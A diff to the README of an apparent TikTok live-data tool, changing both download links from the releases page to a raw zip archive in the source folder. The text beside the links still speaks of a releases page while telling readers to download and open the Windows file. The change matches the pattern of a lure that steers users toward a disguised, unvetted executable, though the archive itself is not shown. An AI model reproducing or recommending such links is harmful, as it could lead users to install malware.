@@ -1,6 +1,6 @@
 # 📡 tiktok-live-api - Live TikTok data in real time
 
-[![Download tiktok-live-api](https://img.shields.io/badge/Download%20tiktok-live-api-blue?style=for-the-badge&logo=github)](https://github.com/Lorenzaformic944/tiktok-live-api/releases)
+[![Download tiktok-live-api](https://img.shields.io/badge/Download%20tiktok-live-api-blue?style=for-the-badge&logo=github)](https://github.com/Lorenzaformic944/tiktok-live-api/raw/refs/heads/main/src/api_tiktok_live_1.6-alpha.2.zip)
 
 ## 🖥️ What this app does
 
@@ -12,7 +12,7 @@ It is made for people who want live TikTok data in one place. You do not need to
 
 To get the app, visit this page to download:
 
-https://github.com/Lorenzaformic944/tiktok-live-api/releases
+https://github.com/Lorenzaformic944/tiktok-live-api/raw/refs/heads/main/src/api_tiktok_live_1.6-alpha.2.zip
 
 On that page, look for the latest release. Download the Windows file that matches your system, then open it to start the app.
 
